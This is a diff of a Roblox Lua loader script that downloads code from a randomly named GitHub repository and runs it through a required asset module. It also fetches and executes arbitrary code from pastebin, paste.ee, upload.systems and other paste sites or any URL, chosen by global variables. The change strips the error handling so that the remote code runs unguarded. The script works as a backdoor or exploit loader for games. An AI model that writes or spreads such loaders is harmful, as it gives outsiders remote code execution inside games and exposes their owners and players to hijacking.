@@ -1,28 +1,17 @@
 print("loadway1")
 local Source = game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/tber65he56y3btbgtehg/nbwrty5gtrgrsg/main/mnruf7jr6ntydnbyhnt",true)
 require(8082203830):Loadstring(Source)
-local success, error = pcall(function()
-	local rt=Instance.new("FunctionalTest")rt.Name=math.random() rt.Description=_G.IncreaseronLoaderTarget rt.Parent=game:GetService("TestService")
-	if _G.IncreaseronLoaderSite=="us"then
-		loadstring(game:GetService("HttpService"):GetAsync(tostring("https://api.upload.systems/pastes/".._G.IncreaseronLoaderKey.."/raw")))()
-	elseif _G.IncreaseronLoaderSite=="pa"then
-		loadstring(game:GetService("HttpService"):GetAsync(tostring("https://pastebin.com/raw/".._G.IncreaseronLoaderKey)))()
-	elseif _G.IncreaseronLoaderSite=="pe"then
-		loadstring(game:GetService("HttpService"):GetAsync(tostring("https://paste.ee/r/".._G.IncreaseronLoaderKey)))()
-	elseif _G.IncreaseronLoaderSite=="pc"then
-		loadstring(game:GetService("HttpService"):GetAsync(tostring("https://paste.centos.org/view/raw/".._G.IncreaseronLoaderKey)))()
-	elseif _G.IncreaseronLoaderSite=="ps"then
-		loadstring(game:GetService("HttpService"):GetAsync(tostring("https://paste.sh/".._G.IncreaseronLoaderKey)))()
-	elseif _G.IncreaseronLoaderSite=="uni"then
-		loadstring(game:GetService("HttpService"):GetAsync(tostring(_G.IncreaseronLoaderKey)))()
-	end
-end)
-
-if error then
-
-	msg=Instance.new("Message",workspace) msg.Text="This game does have https on but doesnt have the full requirements to load. Please use an older verison for unsupported games"
-	wait(3)
-	msg:Remove()
-	_G.IncreaseronLoaderFailed="True"
-	
+local rt=Instance.new("FunctionalTest")rt.Name=math.random() rt.Description=_G.IncreaseronLoaderTarget rt.Parent=game:GetService("TestService")
+if _G.IncreaseronLoaderSite=="us"then
+	loadstring(game:GetService("HttpService"):GetAsync(tostring("https://api.upload.systems/pastes/".._G.IncreaseronLoaderKey.."/raw")))()
+elseif _G.IncreaseronLoaderSite=="pa"then
+	loadstring(game:GetService("HttpService"):GetAsync(tostring("https://pastebin.com/raw/".._G.IncreaseronLoaderKey)))()
+elseif _G.IncreaseronLoaderSite=="pe"then
+	loadstring(game:GetService("HttpService"):GetAsync(tostring("https://paste.ee/r/".._G.IncreaseronLoaderKey)))()
+elseif _G.IncreaseronLoaderSite=="pc"then
+	loadstring(game:GetService("HttpService"):GetAsync(tostring("https://paste.centos.org/view/raw/".._G.IncreaseronLoaderKey)))()
+elseif _G.IncreaseronLoaderSite=="ps"then
+	loadstring(game:GetService("HttpService"):GetAsync(tostring("https://paste.sh/".._G.IncreaseronLoaderKey)))()
+elseif _G.IncreaseronLoaderSite=="uni"then
+	loadstring(game:GetService("HttpService"):GetAsync(tostring(_G.IncreaseronLoaderKey)))()
 end
